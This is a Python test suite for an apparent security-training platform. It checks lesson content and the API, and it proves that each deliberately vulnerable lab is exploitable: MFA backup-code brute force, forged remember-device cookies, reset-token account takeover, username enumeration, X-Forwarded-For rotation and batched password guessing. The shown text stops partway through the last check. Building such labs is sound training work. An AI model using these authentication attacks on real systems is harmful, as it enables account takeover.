#!/usr/bin/env python3
"""Verification suite for CyberLabs.

Three sections, each independently runnable:

  content   static checks over app/content, app/seed.py and the lab app
            sources. No services or Docker required. Catches a lesson pointing
            at a variant that does not exist, a lab variant that exists but has
            no lesson, duplicate slugs, missing fields, bad ordering.

  api       smoke tests against a running backend (./scripts/dev.sh start).
            Includes the check that the walkthrough is never part of the normal
            lesson payload.

  variants  end-to-end: launch each lab through the API, wait for the container,
            assert the *intended vulnerability is actually present and
            exploitable*, then destroy the lab. Requires Docker.

Usage:
    backend/.venv/bin/python scripts/verify.py              # content + api
    backend/.venv/bin/python scripts/verify.py --variants    # + default variant set
    backend/.venv/bin/python scripts/verify.py --all         # + every lab lesson
    backend/.venv/bin/python scripts/verify.py --variant mfa_backup_guess

Exit code is 0 only if every selected check passed.
"""

from __future__ import annotations

import argparse
import http.client
import json
import re
import sys
import time
import urllib.parse
import urllib.request
from dataclasses import dataclass, field
from pathlib import Path

REPO = Path(__file__).resolve().parent.parent
BACKEND = REPO / "backend"
LABS = REPO / "labs" / "default"
API = "http://127.0.0.1:8000"

sys.path.insert(0, str(BACKEND))

FLAG_RE = re.compile(r"FLAG\{[^}]+\}")
# flask's jsonify is compact ({"ok":true}); tolerate either spacing
OK_RE = re.compile(r'"ok"\s*:\s*true')

# Fields every lesson must carry, theory or lab.
CORE_FIELDS = (
    "slug",
    "name",
    "difficulty",
    "category",
    "summary",
    "theory",
)

# Fields only a lab-backed lesson needs. A theory lesson is conceptual - it has
# no scenario to play, no flag to take and nothing to remediate - so these are
# checked against lab lessons only.
LAB_FIELDS = (
    "scenario",
    "objectives",
    "solution",
    "methodology",
    "starting_credentials",
    "endpoints",
    "application_behaviour",
    "success_condition",
    "remediation",
    "detection",
    "references",
)

DIFFICULTIES = {"apprentice", "practitioner", "expert"}


# --------------------------------------------------------------------------- #
# result plumbing
# --------------------------------------------------------------------------- #


@dataclass
class Results:
    passed: int = 0
    failed: int = 0
    skipped: int = 0
    lines: list[str] = field(default_factory=list)

    def check(self, section: str, name: str, ok: bool, detail: str = "") -> bool:
        if ok:
            self.passed += 1
            self.lines.append(f"  \033[32mPASS\033[0m  {name}")
        else:
            self.failed += 1
            self.lines.append(f"  \033[31mFAIL\033[0m  {name}" + (f"\n          {detail}" if detail else ""))
        return ok

    def skip(self, name: str, why: str) -> None:
        self.skipped += 1
        self.lines.append(f"  \033[33mSKIP\033[0m  {name} ({why})")

    def section(self, title: str) -> None:
        self.lines.append(f"\n\033[1m{title}\033[0m")


# --------------------------------------------------------------------------- #
# tiny HTTP client (stdlib only, keeps cookies, speaks to a lab container)
# --------------------------------------------------------------------------- #


@dataclass
class Resp:
    status: int
    body: str
    location: str = ""
    headers: dict = field(default_factory=dict)

    @property
    def text(self) -> str:
        return self.body


class Client:
    """Minimal form-posting HTTP client with a cookie jar.

    Uses one keep-alive connection because the backup-code brute force issues
    thousands of requests and a fresh connection per request dominates runtime.
    """

    def __init__(self, base: str, timeout: float = 15.0):
        p = urllib.parse.urlparse(base)
        self.host = p.hostname
        self.port = p.port or 80
        self.base = base
        self.timeout = timeout
        self.cookies: dict[str, str] = {}
        self._conn = http.client.HTTPConnection(self.host, self.port, timeout=timeout)

    def _reconnect(self) -> None:
        try:
            self._conn.close()
        except Exception:
            pass
        self._conn = http.client.HTTPConnection(self.host, self.port, timeout=self.timeout)

    def request(
        self,
        method: str,
        path: str,
        form: dict | None = None,
        headers: dict | None = None,
        json_body: dict | None = None,
    ) -> Resp:
        hdrs = {"User-Agent": "cyberlabs-verify/1.0"}
        if self.cookies:
            hdrs["Cookie"] = "; ".join(f"{k}={v}" for k, v in self.cookies.items())
        body = None
        if form is not None:
            body = urllib.parse.urlencode(form)
            hdrs["Content-Type"] = "application/x-www-form-urlencoded"
        elif json_body is not None:
            body = json.dumps(json_body)
            hdrs["Content-Type"] = "application/json"
        if headers:
            hdrs.update(headers)

        for attempt in (0, 1):
            try:
                self._conn.request(method, path, body=body, headers=hdrs)
                raw = self._conn.getresponse()
                data = raw.read().decode("utf-8", "replace")
                for key, value in raw.getheaders():
                    if key.lower() == "set-cookie":
                        name, _, rest = value.partition("=")
                        self.cookies[name.strip()] = rest.split(";")[0]
                return Resp(
                    status=raw.status,
                    body=data,
                    location=raw.getheader("Location", "") or "",
                    headers={k.lower(): v for k, v in raw.getheaders()},
                )
            except (http.client.HTTPException, OSError):
                if attempt:
                    raise
                self._reconnect()
        raise RuntimeError("unreachable")

    def post(self, path: str, form: dict | None = None, **kw) -> Resp:
        return self.request("POST", path, form=form, **kw)

    def get(self, path: str, **kw) -> Resp:
        return self.request("GET", path, **kw)


def api(method: str, path: str, payload: dict | None = None) -> tuple[int, object]:
    data = json.dumps(payload).encode() if payload is not None else None
    req = urllib.request.Request(API + path, data=data, method=method)
    if data:
        req.add_header("Content-Type", "application/json")
    try:
        with urllib.request.urlopen(req, timeout=30) as r:
            return r.status, json.loads(r.read() or b"null")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")


def backend_up() -> bool:
    try:
        status, _ = api("GET", "/api/stats")
        return status == 200
    except Exception:
        return False


# --------------------------------------------------------------------------- #
# section 1: content
# --------------------------------------------------------------------------- #


def load_lessons() -> list[dict]:
    from app.seed import TOPICS  # noqa: PLC0415

    out = []
    for topic in TOPICS:
        for v in topic.get("vulns", []):
            out.append(v)
    return out


def implemented_variants() -> dict[str, set[str]]:
    """Variants each lab app actually implements, read from its source.

    A variant name appears as a `VARIANT == "<name>"` comparison, an `in (...)`
    membership test, or a bare string in the module docstring's variant list.
    Some apps assign `variant = VARIANT` locally and branch on that, so both
    spellings are matched.
    """
    families: dict[str, set[str]] = {}
    for app_py in sorted(LABS.glob("*/app.py")):
        family = app_py.parent.name
        src = app_py.read_text()
        found = set(re.findall(r'\bVARIANT\s*==\s*"([a-z0-9_]+)"', src))
        found |= set(re.findall(r'\bvariant\s*==\s*"([a-z0-9_]+)"', src))
        found |= set(re.findall(r'\bVARIANT\s+in\s*\(?\s*"([a-z0-9_]+)"', src))
        families[family] = found
    return families


def check_source_covers_flag(fn) -> bool:
    """Does this check (and anything it delegates to) assert a reachable flag?

    Walks the module-level functions the check calls, so a check may share its
    tail with another variant (the reset checks do) without losing the
    assertion.
    """
    import inspect

    module_globals = dict(globals())
    seen, queue, blob = set(), [fn], []
    while queue:
        cur = queue.pop()
        if cur.__name__ in seen:
            continue
        seen.add(cur.__name__)
        try:
            src = inspect.getsource(cur)
        except (OSError, TypeError):
            continue
        blob.append(src)
        for name in re.findall(r"\b(v_[a-z0-9_]+)\b", src):
            target = module_globals.get(name)
            if callable(target):
                queue.append(target)
    return "FLAG_RE" in "".join(blob)


def app_routes() -> dict[str, set[str]]:
    """Every route each lab app actually serves, read from its source.

    Compared against each lesson's `endpoints` field so a lesson cannot claim a
    route the app does not have (or omit one the exploit needs).
    """
    out: dict[str, set[str]] = {}
    for app_py in sorted(LABS.glob("*/app.py")):
        src = app_py.read_text()
        routes = set()
        for method, path in re.findall(
            r'@app\.(get|post|put|delete|patch)\(\s*"([^"]+)"', src
        ):
            routes.add(f"{method.upper()} {path}")
        out[app_py.parent.name] = routes
    return out


def check_content(r: Results) -> list[dict]:
    from app.services.lab_runner import DEFAULT_PORTS  # noqa: PLC0415

    lessons = load_lessons()
    r.section(f"content  ({len(lessons)} lessons)")

    # -- slugs
    slugs = [v["slug"] for v in lessons]
    dupes = sorted({s for s in slugs if slugs.count(s) > 1})
    r.check("content", "lesson slugs are unique", not dupes, f"duplicates: {dupes}")

    # -- required fields
    missing = {}
    for v in lessons:
        want = list(CORE_FIELDS) + (list(LAB_FIELDS) if v.get("default_lab_slug") else [])
        gaps = [f for f in want if not str(v.get(f, "") or "").strip()]
        if gaps:
            missing[v["slug"]] = gaps
    r.check(
        "content",
        "every lesson has its required fields non-empty",
        not missing,
        "; ".join(f"{k}: {v}" for k, v in list(missing.items())[:5]),
    )

    # -- difficulty / xp
    bad_diff = [v["slug"] for v in lessons if v.get("difficulty") not in DIFFICULTIES]
    r.check("content", "difficulty is apprentice|practitioner|expert", not bad_diff, str(bad_diff))

    # -- hints parse as a list and are tiered (lab lessons only; theory lessons
    #    have no puzzle to nudge)
    bad_hints = []
    for v in lessons:
        if not v.get("default_lab_slug"):
            continue
        try:
            h = json.loads(v.get("hints") or "[]")
            if not isinstance(h, list) or len(h) < 3:
                bad_hints.append(v["slug"])
        except Exception:
            bad_hints.append(v["slug"])
    r.check("content", "lab hints parse as a JSON list of 3+ tiers", not bad_hints, str(bad_hints))

    # -- lab mapping
    from app.services.lab_runner import DEFAULT_PORTS  # noqa: F811

    labs = [v for v in lessons if v.get("default_lab_slug")]
    bad_family = [v["slug"] for v in labs if v["default_lab_slug"] not in DEFAULT_PORTS]
    r.check(
        "content",
        "every lab lesson names a family in lab_runner.DEFAULT_PORTS",
        not bad_family,
        str(bad_family),
    )

    unknown_port = [f for f in DEFAULT_PORTS if not (LABS / f / "app.py").exists()]
    r.check("content", "every DEFAULT_PORTS family has an app", not unknown_port, str(unknown_port))

    no_dir = [f for f in DEFAULT_PORTS if not (LABS / f).is_dir()]
    r.check("content", "every DEFAULT_PORTS family has a directory", not no_dir, str(no_dir))

    # -- the check that would have caught the original gap
    variants = implemented_variants()
    bad_variant = [
        f"{v['slug']} -> {v['lab_variant']}"
        for v in labs
        if v["lab_variant"] not in variants.get(v["default_lab_slug"], set())
    ]
    r.check(
        "content",
        "every lab lesson names a variant the app implements",
        not bad_variant,
        "; ".join(bad_variant),
    )

    # -- reverse direction: an implemented variant with no lesson
    taught = {(v["default_lab_slug"], v["lab_variant"]) for v in labs}
    orphans = [
        f"{family}/{var}"
        for family, vs in variants.items()
        for var in sorted(vs)
        if (family, var) not in taught
    ]
    r.check(
        "content",
        "every implemented lab variant has a lesson",
        not orphans,
        f"variants with no lesson: {orphans}",
    )

    # -- behavioural coverage: a lesson that only has a name mapping is not
    # verified. Every implemented variant must have a registered exploit check,
    # otherwise a new lesson can ship with no proof its vulnerability is real.
    unchecked = sorted(f"{family}/{var}" for family, vs in variants.items() for var in vs
                       if var not in CHECKS)
    r.check(
        "content",
        "every implemented lab variant has a behavioural check",
        not unchecked,
        f"variants with no exploit check: {unchecked}"
        if unchecked
        else f"{len(CHECKS)} checks cover {sum(len(v) for v in variants.values())} variants",
    )

    # -- a lesson that promises the flag must have a check that proves it
    unproven = sorted(
        f"{v['slug']} (variant {v['lab_variant']})"
        for v in labs
        if "flag" in v.get("success_condition", "").lower()
        and v["lab_variant"] in CHECKS
        and not check_source_covers_flag(CHECKS[v["lab_variant"]])
    )
    r.check(
        "content",
        "every lesson promising the flag has a check that proves it is reachable",
        not unproven,
        f"no flag assertion in the check for: {unproven}" if unproven
        else f"{sum(1 for v in labs if 'flag' in v.get('success_condition', '').lower())} "
             f"flag-bearing lessons are behaviourally proven",
    )

    # -- the endpoints each lesson advertises must exist in its lab app
    routes_by_family = app_routes()
    mismatched = []
    for v in labs:
        real = routes_by_family.get(v["default_lab_slug"], set())
        claimed = {
            part.strip()
            for part in re.split(r"[\u00b7,]", v.get("endpoints", ""))
            if part.strip()
        }
        invented = sorted(c for c in claimed if c not in real)
        if invented:
            mismatched.append(f"{v['slug']}: {invented}")
    r.check(
        "content",
        "every endpoint a lesson advertises exists in its lab app",
        not mismatched,
        "; ".join(mismatched) if mismatched
        else f"{len(labs)} lab lessons match their app's routes",
    )

    # -- ordering
    orders = sorted(v["sort_order"] for v in labs)
    r.check(
        "content",
        "lab lesson sort_order is a contiguous 1..N run",
        orders == list(range(1, len(labs) + 1)),
        str(orders),
    )
    theory_orders = sorted(v["sort_order"] for v in lessons if not v.get("default_lab_slug"))
    r.check(
        "content",
        "theory lessons are ordered ahead of the labs (negative)",
        theory_orders and max(theory_orders) < 0,
        str(theory_orders),
    )

    # -- port collisions
    ports = list(DEFAULT_PORTS.values())
    r.check("content", "lab ports are unique", len(ports) == len(set(ports)), str(ports))

    return lessons


# --------------------------------------------------------------------------- #
# section 2: api
# --------------------------------------------------------------------------- #


def check_api(r: Results, lessons: list[dict]) -> None:
    r.section("api")
    if not backend_up():
        r.skip("api", "backend not running on 127.0.0.1:8000")
        return

    status, stats = api("GET", "/api/stats")
    r.check("api", "GET /api/stats responds 200", status == 200)
    if status == 200:
        r.check(
            "api",
            f"stats.total_vulns == seeded lessons ({stats.get('total_vulns')})",
            stats.get("total_vulns") == len(lessons),
            f"db has {stats.get('total_vulns')}, content has {len(lessons)}",
        )

    status, topics = api("GET", "/api/topics")
    r.check("api", "GET /api/topics responds 200", status == 200)
    if status != 200:
        return

    r.check("api", "at least one topic is seeded", len(topics) > 0)

    # walkthrough must never ride along with the normal payload
    leaked = []
    checked = 0
    for topic in topics:
        status, detail = api("GET", f"/api/topics/{topic['slug']}")
        if status != 200:
            continue
        for v in detail.get("vulns", []):
            checked += 1
            if "solution" in v:
                leaked.append(v["slug"])
    r.check(
        "api",
        f"solution absent from all {checked} lesson payloads",
        not leaked,
        f"leaked on: {leaked}",
    )

    # ...and must be available on explicit request, for a lesson that has one
    status, detail = api("GET", "/api/topics/authentication")
    lab_vulns = [v for v in (detail.get("vulns", []) if status == 200 else [])
                 if v.get("default_lab_slug")]
    if lab_vulns:
        vid = lab_vulns[0]["id"]
        st, sol = api("POST", f"/api/vulns/{vid}/solution", {})
        r.check(
            "api",
            f"POST /api/vulns/{{vid}}/solution returns the walkthrough ({lab_vulns[0]['slug']})",
            st == 200 and isinstance(sol, dict) and bool(sol.get("solution")),
            f"status={st} body={str(sol)[:160]}",
        )
    else:
        r.check("api", "at least one lab-backed lesson exists", False, "none found in topic detail")

    # progress round-trip
    st, detail = api("GET", "/api/topics/authentication")
    if st == 200 and detail.get("vulns"):
        vid = detail["vulns"][0]["id"]
        st, prog = api("POST", f"/api/progress/{vid}", {"attempts_delta": 1})
        ok = st == 200 and isinstance(prog, dict) and prog.get("attempts", 0) >= 1
        r.check("api", "POST /api/progress/{id} records an attempt", ok, f"status={st}")
        # leave the row as we found it
        api("POST", f"/api/progress/{vid}", {"completed": False, "attempts_delta": -prog["attempts"]})


# --------------------------------------------------------------------------- #
# section 3: variant exploit checks
# --------------------------------------------------------------------------- #

FLAG_TMPL = "FLAG{{lab{id}_{{rand}}}}"


def launch(vuln_slug: str, timeout: float = 420.0) -> tuple[int, str]:
    status, lab = api("POST", "/api/labs/default", {"vuln_slug": vuln_slug})
    if status != 200 or not isinstance(lab, dict):
        raise RuntimeError(f"launch failed for {vuln_slug}: {status} {str(lab)[:200]}")
    lab_id = lab["id"]
    deadline = time.time() + timeout
    while time.time() < deadline:
        _, cur = api("GET", f"/api/labs/{lab_id}")
        if not isinstance(cur, dict):
            raise RuntimeError(f"lab {lab_id} vanished")
        if cur["status"] == "running" and cur.get("url"):
            return lab_id, cur["url"]
        if cur["status"] in ("error", "failed"):
            raise RuntimeError(f"lab {lab_id} {cur['status']}: {cur.get('error')[:300]}")
        time.sleep(3)
    raise RuntimeError(f"lab {lab_id} did not reach running within {timeout}s")


def destroy(lab_id: int) -> None:
    try:
        api("DELETE", f"/api/labs/{lab_id}")
    except Exception:
        pass


# -- individual variant checks ------------------------------------------------


def v_brute_unlimited(c: Client) -> list[tuple[str, bool, str]]:
    out = []
    base = "http://<lab>"
    statuses, bodies = set(), set()
    for _ in range(30):
        resp = c.post("/login", form={"username": "bob", "password": "wrong-guess"})
        statuses.add(resp.status)
        bodies.add(re.search(r"class='err'>([^<]*)", resp.body).group(1)
                   if re.search(r"class='err'>([^<]*)", resp.body) else resp.body[:40])
    out.append(("30 failed logins never return 429", 429 not in statuses, f"statuses={statuses}"))
    out.append(("30 failed logins all return 200", statuses == {200}, f"statuses={statuses}"))
    out.append((
        "every failed login returns the identical message",
        len(bodies) == 1 and "Invalid credentials." in next(iter(bodies)),
        f"{bodies}",
    ))

    resp = c.post("/login", form={"username": "bob", "password": "hunter2"})
    out.append((
        "correct password still authenticates after 30 failures (no lockout damage)",
        "Signed in as bob" in resp.body,
        resp.body[:120],
    ))
    out.append((
        "account page exposes a flag",
        bool(FLAG_RE.search(resp.body)),
        FLAG_RE.findall(resp.body)[:1] or resp.body[:160],
    ))
    return out


def v_enum_response(c: Client) -> list[tuple[str, bool, str]]:
    unknown = c.post("/login", form={"username": "nosuchuser", "password": "x"})
    known = c.post("/login", form={"username": "alice", "password": "x"})
    m_unknown = re.search(r"class='err'>([^<]*)", unknown.body)
    m_known = re.search(r"class='err'>([^<]*)", known.body)
    out = [
        ("unknown user yields a distinct message", bool(m_unknown) and "No account found" in m_unknown.group(1),
         m_unknown.group(1) if m_unknown else "none"),
        ("known user yields a distinct message", bool(m_known) and "Incorrect password" in m_known.group(1),
         m_known.group(1) if m_known else "none"),
    ]
    good = c.post("/login", form={"username": "alice", "password": "alice-secret-2024"})
    out.append(("valid login returns the account page and flag",
                "Signed in as alice" in good.body and bool(FLAG_RE.search(good.body)),
                good.body[:120]))
    return out


def v_mfa_trusted_device(c: Client) -> list[tuple[str, bool, str]]:
    import hashlib

    out = []
    landing = c.post("/login", form={"username": "carol", "password": "carol-pw-9911"})
    out.append(("the lesson's target account reaches the challenge",
                "/mfa" in landing.location, f"location={landing.location!r}"))
    if "/mfa" not in landing.location:
        return out
    wrong = c.post("/verify", form={"code": "000000"})
    out.append(("a wrong code does not satisfy the second factor",
                "/account" not in wrong.location, f"location={wrong.location!r}"))
    token = hashlib.sha256(b"carol").hexdigest()[:8]
    forged = c.post("/verify", form={"code": "000000"},
                    headers={"Cookie": f"remember_device={token}"})
    out.append(("forged predictable remember_device cookie redirects to /account",
                "/account" in forged.location, f"location={forged.location!r}"))
    acct = c.get("/account", headers={"Cookie": f"remember_device={token}"})
    out.append(("/account exposes a flag after the cookie bypass",
                bool(FLAG_RE.search(acct.body)), acct.body[:160]))
    return out


def v_mfa_backup_guess(c: Client) -> list[tuple[str, bool, str]]:
    landing = c.post("/login", form={"username": "carol", "password": "carol-pw-9911"})
    out = []
    # carol is the account the lesson names. If login stops starting a
    # challenge for her, every assertion below silently passes against a dead
    # session, so assert the challenge exists first.
    out.append((
        "the lesson's target account (carol) reaches the challenge",
        "/mfa" in landing.location,
        f"location={landing.location!r}",
    ))
    if "/mfa" not in landing.location:
        return out

    # 1. the SMS path must still be throttled, so the weakness is isolated
    sms_statuses = []
    for _ in range(5):
        sms_statuses.append(c.post("/verify", form={"code": "000000"}).status)
    out.append((
        "POST /verify is rate limited (429 appears within 5 attempts)",
        429 in sms_statuses,
        f"statuses={sms_statuses}",
    ))

    # 2. regression guard: the old stub accepted 000000 as a universal code
    bypass = c.post("/verify", form={"code": "000000"})
    out.append((
        "regression: 000000 is NOT accepted as a universal code on /verify",
        "/account" not in bypass.location,
        f"location={bypass.location!r}",
    ))

    # 3. the recovery path is reachable
    form = c.get("/verify-backup")
    out.append(("GET /verify-backup serves the backup form", form.status == 200
                and "backup_code" in form.body, f"status={form.status}"))

    # 4. and is unbounded
    statuses, messages = set(), set()
    for i in range(100):
        resp = c.post("/verify-backup", form={"backup_code": f"{i:04d}"})
        statuses.add(resp.status)
        m = re.search(r"class='err'>([^<]*)", resp.body)
        messages.add(m.group(1) if m else "?")
    out.append(("100 wrong backup codes never return 429", 429 not in statuses, f"statuses={statuses}"))
    out.append(("every wrong backup code returns the same message", len(messages) == 1,
                f"{messages}"))

    # 5. the 4-digit space is actually searchable
    found = None
    for i in range(10000):
        resp = c.post("/verify-backup", form={"backup_code": f"{i:04d}"})
        if resp.status in (301, 302) and "/account" in resp.location:
            found = f"{i:04d}"
            break
    out.append((
        "brute forcing 0000-9999 reaches /account",
        found is not None,
        f"code={found}" if found else "no code found in 10,000 attempts",
    ))

    if found:
        acct = c.get("/account")
        out.append(("/account exposes a flag after the backup-code bypass",
                    bool(FLAG_RE.search(acct.body)), acct.body[:160]))
    return out


def v_mfa_simple_bypass(c: Client) -> list[tuple[str, bool, str]]:
    out = []
    # regression guard: /account used to fall back to carol when no challenge
    # was pending, which served the admin panel to an anonymous visitor
    out += v_mfa_simple_bypass_anon(c)
    landing = c.post("/login", form={"username": "carol", "password": "carol-pw-9911"})
    out.append(("login redirects to the challenge", "/mfa" in landing.location,
                f"location={landing.location!r}"))
    acct = c.get("/account")
    out.append(("/account renders without any code submitted",
                "Account:" in acct.body and bool(FLAG_RE.search(acct.body)), acct.body[:160]))
    return out


def v_mfa_broken_logic(c: Client) -> list[tuple[str, bool, str]]:
    out = []
    landing = c.post("/login", form={"username": "carol", "password": "carol-pw-9911"})
    out.append(("the lesson's target account reaches the challenge",
                "/mfa" in landing.location, f"location={landing.location!r}"))
    if "/mfa" not in landing.location:
        return out
    wrong = c.post("/verify", form={"code": "000000"})
    out.append(("a wrong code alone does not satisfy the second factor",
                "/account" not in wrong.location, f"location={wrong.location!r}"))
    claimed = c.post("/verify", form={"code": "000000", "mfa_ok": "true"})
    out.append(("mfa_ok=true is accepted in place of a code",
                "/account" in claimed.location, f"location={claimed.location!r}"))
    acct = c.get("/account", headers={})
    out.append(("/account exposes a flag after the bypass",
                bool(FLAG_RE.search(acct.body)), acct.body[:160]))
    return out


def lab_fixture_code(name: str) -> str | None:
    """Read a fixture secret out of the lab source.

    A test is allowed to know the answer; the point of these checks is that the
    endpoint accepts the answer and that nothing rate-limits the search, not
    that the tester is forbidden from reading the fixture.
    """
    src = (LABS / "auth_mfa" / "app.py").read_text()
    m = re.search(rf'^{name}\s*=\s*"([0-9]+)"', src, re.M)
    return m.group(1) if m else None


def v_mfa_bruteforce(c: Client) -> list[tuple[str, bool, str]]:
    """Two separate claims:

    1. the weakness - /verify never throttles a 6-digit guess
    2. the payoff   - a guessed code really does open the account page
    """
    landing = c.post("/login", form={"username": "carol", "password": "carol-pw-9911"})
    out = [("the lesson's target account reaches the challenge",
            "/mfa" in landing.location, f"location={landing.location!r}")]
    if "/mfa" not in landing.location:
        return out

    # 2000 wrong guesses, not 40: a soft cap that only bites after a few hundred
    # attempts would pass a 40-sample test, and the sample must start from zero
    # so the very first attempts are covered too. Measured throughput on the lab
    # container is ~66 req/s, so this costs about half a minute. Walking the full
    # 10^6 space was measured at ~4 hours and proves nothing extra: every
    # plausible control threshold (5, 10, 100, 1000) is inside this sample.
    sample = 2000
    statuses, msgs = set(), set()
    for _ in range(sample):
        r = c.post("/verify", form={"code": "000000"})
        statuses.add(r.status)
        m = re.search(r"class='err'>([^<]*)", r.body)
        msgs.add(m.group(1) if m else "?")
    out.append((f"{sample} wrong codes never return 429", 429 not in statuses,
                f"statuses={statuses}"))
    out.append((f"{sample} wrong codes all return 200", statuses == {200},
                f"statuses={statuses}"))
    out.append(("every wrong code returns the same message", len(msgs) == 1, f"{msgs}"))

    code = lab_fixture_code("CODE")
    if not code:
        out.append(("the 6-digit code fixture is discoverable", False, "CODE not found in app.py"))
        return out
    out.append(("the code is a 6-digit space", len(code) == 6, f"len={len(code)}"))

    right = c.post("/verify", form={"code": code})
    out.append(("a correct guessed code redirects to /account",
                "/account" in right.location, f"location={right.location!r}"))
    acct = c.get("/account")
    out.append(("/account exposes a flag after the guessed code",
                bool(FLAG_RE.search(acct.body)),
                FLAG_RE.findall(acct.body)[:1] or acct.body[:160]))
    return out


def v_reset_predictable(c: Client) -> list[tuple[str, bool, str]]:
    out = []
    mail = c.post("/forgot", form={"email": "alice@northwind-retail.test"})
    m = re.search(r"token=(\d+)&user=(\S+)", mail.body)
    out.append(("POST /forgot delivers a token", bool(m), mail.body[:200]))
    if not m:
        return out
    out.append((
        "delivered token is a low sequential integer",
        m.group(1).isdigit() and int(m.group(1)) < 2000,
        f"token={m.group(1)}",
    ))

    # a token that was never issued is still accepted
    resp = c.post("/reset", form={"token": "4821", "user": "carol", "password": "hijacked"})
    out.append((
        "an unissued token (4821) still resets carol",
        "Password updated for carol." in resp.body,
        resp.body[:200],
    ))

    # the floor is the only validation
    below = c.post("/reset", form={"token": "99", "user": "carol", "password": "x"})
    out.append(("a token below the floor is rejected", "invalid" in below.body.lower(),
                below.body[:160]))
    nonnum = c.post("/reset", form={"token": "abc", "user": "carol", "password": "x"})
    out.append(("a non-integer token is rejected", "invalid" in nonnum.body.lower(),
                nonnum.body[:160]))
    # the lesson now ends with signing in, so prove that leg too
    out += v_reset_full_chain(c, token="4242")
    return out


def v_reset_broken_logic(c: Client) -> list[tuple[str, bool, str]]:
    resp = c.post("/reset", form={"token": "1001", "user": "carol", "password": "hijacked"})
    out = [("a token issued for alice resets carol", "Password updated for carol." in resp.body,
            resp.body[:200])]
    bad = c.post("/reset", form={"token": "9999", "user": "carol", "password": "x"})
    out.append(("a token that does not exist is still rejected", "invalid" in bad.body.lower(),
                bad.body[:160]))
    # the lesson ends "then sign in as carol to retrieve the flag"
    out += v_reset_full_chain(c, token="1001")
    return out


def v_enum_subtle(c: Client) -> list[tuple[str, bool, str]]:
    """Same wording, different status code and body length."""
    unknown = c.post("/login", form={"username": "nosuchuser", "password": "x"})
    known = c.post("/login", form={"username": "alice", "password": "x"})
    m_u = re.search(r"class='err'>([^<]*)", unknown.body)
    m_k = re.search(r"class='err'>([^<]*)", known.body)
    return [
        ("the wording is identical for both failures",
         bool(m_u) and bool(m_k) and m_u.group(1) == m_k.group(1) == "Invalid credentials.",
         f"unknown={m_u.group(1) if m_u else None!r} known={m_k.group(1) if m_k else None!r}"),
        ("status code discloses existence (404 vs 200)",
         unknown.status == 404 and known.status == 200,
         f"unknown={unknown.status} known={known.status}"),
        ("body length discloses existence",
         len(unknown.body) != len(known.body),
         f"unknown={len(unknown.body)}B known={len(known.body)}B"),
        ("a valid login still reaches the account page",
         "Signed in as alice" in c.post("/login", form={"username": "alice", "password": "alice-secret-2024"}).body,
         "valid login failed"),
    ]


def v_enum_timing(c: Client) -> list[tuple[str, bool, str]]:
    """Byte-identical responses; the difference is how long they take."""
    unknown = c.post("/login", form={"username": "nosuchuser", "password": "x"})
    known = c.post("/login", form={"username": "alice", "password": "x"})
    out = [
        ("status and body are identical for both failures",
         unknown.status == known.status and unknown.body == known.body,
         f"{unknown.status}/{len(unknown.body)}B vs {known.status}/{len(known.body)}B"),
    ]
    # interleave the samples so drift hits both arms equally
    tu, tk = [], []
    for _ in range(7):
        t0 = time.perf_counter()
        c.post("/login", form={"username": "nosuchuser", "password": "x"})
        tu.append(time.perf_counter() - t0)
        t0 = time.perf_counter()
        c.post("/login", form={"username": "alice", "password": "x"})
        tk.append(time.perf_counter() - t0)
    mu, mk = sorted(tu)[3], sorted(tk)[3]
    out.append((
        "existing account is measurably slower (median of 7)",
        mk - mu > 0.25,
        f"known={mk * 1000:.0f}ms unknown={mu * 1000:.0f}ms delta={(mk - mu) * 1000:.0f}ms",
    ))
    return out


def v_enum_lock(c: Client) -> list[tuple[str, bool, str]]:
    """Lockout is per account, which is itself the disclosure oracle."""
    out = []
    real_statuses = [c.post("/login", form={"username": "alice", "password": "bad"}).status
                     for _ in range(4)]
    out.append((
        "a real account locks out and returns 429",
        429 in real_statuses and real_statuses[-1] == 429,
        f"statuses={real_statuses}",
    ))
    lock_msg = c.post("/login", form={"username": "alice", "password": "bad"})
    out.append(("the lockout response names the account as locked",
                "locked" in lock_msg.body.lower(), lock_msg.body[:160]))

    fake_statuses = [c.post("/login", form={"username": "nosuchuser", "password": "bad"}).status
                     for _ in range(6)]
    out.append((
        "a non-existent username never locks out",
        429 not in fake_statuses,
        f"statuses={fake_statuses}",
    ))
    other = c.post("/login", form={"username": "bob", "password": "hunter2"})
    out.append(("locking one account does not lock another",
                "Signed in as bob" in other.body, other.body[:120]))
    return out


def v_brute_ipblock(c: Client) -> list[tuple[str, bool, str]]:
    """The block is keyed on a client-supplied header."""
    out = []
    same_ip = [c.post("/login", form={"username": "bob", "password": "bad"},
                      headers={"X-Forwarded-For": "10.0.0.1"}).status
               for _ in range(5)]
    out.append((
        "repeated attempts from one X-Forwarded-For value get blocked",
        429 in same_ip,
        f"statuses={same_ip}",
    ))
    rotated = c.post("/login", form={"username": "bob", "password": "bad"},
                     headers={"X-Forwarded-For": "10.0.0.2"})
    out.append((
        "a new X-Forwarded-For value is not blocked",
        rotated.status == 200,
        f"status={rotated.status}",
    ))
    # now recover bob's weak password the way the lesson describes: rotate the
    # header per guess so every attempt looks like a new client
    wordlist = ["password", "123456", "letmein", "qwerty", "welcome", "monkey",
                "dragon", "football", "abc123", "shadow", "sunshine", "princess",
                "trustno1", "iloveyou", "batman", "access", "hunter2"]
    for i, word in enumerate(wordlist):
        resp = c.post("/login", form={"username": "bob", "password": word},
                      headers={"X-Forwarded-For": f"10.1.0.{i + 1}"})
        if "Signed in as bob" in resp.body:
            out.append(("brute forcing bob succeeds while rotating the header",
                        True, f"attempts={i + 1} password={word!r}"))
            out.append(("the account page exposes a flag",
                        bool(FLAG_RE.search(resp.body)),
                        FLAG_RE.findall(resp.body)[:1] or resp.body[:160]))
            return out
    out.append(("brute forcing bob succeeds while rotating the header", False,
                f"no success in {len(wordlist)} guesses"))
    return out


def v_brute_multipass(c: Client) -> list[tuple[str, bool, str]]:
    """A JSON array in the username field turns one request into N attempts."""
    only_wrong = [{"username": "bob", "password": f"guess-{i}"} for i in range(40)]
    out = [
        ("a batch of 40 wrong pairs fails in one request",
         "Signed in" not in c.post("/login", form={"username": json.dumps(only_wrong),
                                                    "password": ""}).body,
         "batch with no valid pair authenticated"),
    ]
    batch = [{"username": "alice", "password": "wrong"}, {"username": "bob", "password": "wrong"}]
    batch += [{"username": "bob", "password": f"guess-{i}"} for i in range(20)]
    batch.append({"username": "bob", "password": "hunter2"})
    resp = c.post("/login", form={"username": json.dumps(batch), "password": ""})
    out.append((
        "one request authenticates the matching entry out of 23",
        "Signed in as bob" in resp.body,
        resp.body[:160],
    ))
